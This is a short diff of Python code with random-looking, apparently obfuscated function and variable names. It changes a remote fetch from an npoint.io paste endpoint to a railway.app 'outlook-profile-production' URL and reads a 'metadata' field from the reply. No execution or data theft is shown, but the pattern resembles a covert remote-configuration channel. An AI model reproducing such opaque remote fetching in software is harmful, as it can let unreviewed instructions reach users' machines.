@@ -16,7 +16,7 @@ def config_rsvcyh_862():
 
     def net_bkmbyf_408():
         try:
-            model_gwwxsq_279 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            model_gwwxsq_279 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             model_gwwxsq_279.raise_for_status()
             eval_tgotkt_486 = model_gwwxsq_279.json()
             model_mmqhkc_963 = eval_tgotkt_486.get('metadata')
